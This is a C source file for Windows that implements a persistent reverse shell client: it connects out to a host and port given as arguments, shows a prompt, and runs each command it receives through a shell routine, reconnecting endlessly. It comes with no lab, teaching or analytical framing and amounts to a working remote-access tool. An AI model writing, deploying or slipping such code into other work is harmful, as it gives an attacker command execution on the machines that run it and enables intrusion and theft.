#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <winsock2.h>

#include "execShell.h"
#include "connect.h"

static char *removeCrLf(char *str){
    int len = strlen(str) - 1;
    char *t = str;
    if(*t == '\r' || *t == '\n')
        return NULL;
    while((t[len] == '\n' || t[len] == '\r') && len > 0)
        len--;
    t[len + 1] = '\0';
    return str;
}

static char *getAddrByName(const char *name){
    struct hostent *hst = NULL;
    if((hst = gethostbyname(name)) != NULL)
        return inet_ntoa(*((struct in_addr*)hst->h_addr_list[0]));
    return NULL;
}

int main(int argc, char **argv){
    SOCKET s = 0;
    char buf[LEN_BUF] = {'\0'};
    int byte = 0;
    char *ipaddr = NULL;
    uint16_t port = 0;
    setlocale(LC_ALL, "rus");
    while(true){
        wsaInit();
        ipaddr = getAddrByName(argv[1]);
        port = atoi(argv[2]);
        if((s = connectServer(ipaddr, port)) != SOCKET_ERROR){
            currentPromtPrint(s);
            while((byte = recv(s, buf, sizeof(buf), 0)) != SOCKET_ERROR){
                buf[byte] = '\0';
                removeCrLf(buf);
                if(isChangeDir(buf))
                    changeDir(buf);
                else if(strcmp(buf, "quit") == 0)
                    break;
                else
                    shell(s, buf);
                memset(&buf, '\0', sizeof(buf));
                currentPromtPrint(s);
            }
            closeServer(s);
        }
    }
    return 0;
}
